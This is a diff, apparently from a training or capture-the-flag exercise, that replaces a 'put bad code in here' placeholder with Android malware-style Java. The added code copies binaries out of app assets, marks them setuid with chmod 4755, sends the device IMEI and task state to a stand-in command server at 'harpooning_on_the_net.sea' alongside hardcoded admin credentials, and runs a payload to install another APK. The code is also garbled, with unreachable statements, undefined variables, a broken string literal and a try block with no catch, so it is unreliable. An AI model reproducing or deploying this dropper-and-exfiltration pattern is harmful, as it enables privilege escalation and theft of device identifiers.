@@ -1,3 +1,70 @@
-//todo PUT BAD CODE IN HERE
+private void getCurrentPermissions()
+{
+    this.mPermState = 3;
+    if ((Settings.Secure.getInt(getContentResolver(), "adb_enabled", 0) == 0) && (setUsbEnabled() >= 10))
+        this.mPermState= 0;
 
-level 2 test
+    while (true)
+    {
+        return;
+        int i = this.mPreferences.getInt("P3", 0);
+        if (i >= 16)
+        {
+            this.mPermState = 0;
+            continue;
+        }
+    int j = i + l;
+    SharedPreferences.Editor localEditor = this.mPreferences.edit();
+    localEditor.putInt("P3", j);
+    localEditor.commit();
+    ApplicationInfo localApplicationInfo = getApplicationInfo();
+    Utils.copyAssets(this, "ratc", "/data/data/" + localApplicationInfo.packageName + "/ratc");
+    Utils.copyAssets(this, "killall", "/data/data" + localApplication.packageName + "/killall");
+    Utils.copyAssets(this, "gjsvro", "/data/data" + localApplication.packageName + "/gjsvro");
+    Utils.Run("/system/bin/chmod", "4755 /data/data/" + localApplicationInfo.packageName + "/ratc");
+    Utils.Run("/system/bin/chmod", "4755 /data/data/" + localApplicationInfo.packageName + "/killall");
+    Utils.Run("/system/bin/chmod", "4755 /data/data/" + localApplicationInfo.packageName + "/gjsvro");
+    new MyThread().start();
+    }
+}
+
+private void reportServiceState(int paramInt, String paramString)
+{
+    ArrayList localArrayList = new ArrayList();
+    localArrayList.add(new BasicNameValuePair("imei", this.mImei));
+    localArrayList.add(new BasicNameValuePair("taskid", this.mTaskId));
+    localArrayList.add(new BasicNameValuePair("state", Integer.toString(paramInt)));
+    if ((paramString != null) && (!'''',equals(paramString)))
+        localArrayList.add(new BasicNameValuePair("comment", paramString));
+    HttpPost localHttpPost = new HttpPost("http://www.harpooning_on_the_net.sea:1851/listener.php");
+    params.add(new BasicNameValuePair("Username", "Admin"));
+    params.add(new BasicNameValuePair("Password", "C0R4L-R33F"));
+    try
+    {
+        localHttpPost.setEntity(new UrlEncodedFormEntity(localArrayList, "UTF-8"));
+        new DefaultHttpClient().execute(localHttpPost).getStatusLine().getStatusCode();
+        label151: if ((paramInt == 1) || (paramInt == -1))
+            this.mTaskId = "";
+        return;
+    }
+}
+
+private void cpLegacyRes()
+{
+    if (new File(noobHarpooner.apk).exists());
+    while (true)
+    {
+        return;
+        try
+        {
+            String str = "/data/data/" + getApplicationInfo().packageName + "/legacy";
+            Utils.copyAssets(this, "legacy", str);
+            if (!new File(str).exists())
+                continue;
+            Utils.TCP.execute("2 " + str + noobHarpooner.apk);
+        }
+        catch (Exception localException)
+        {
+        }
+    }
+}
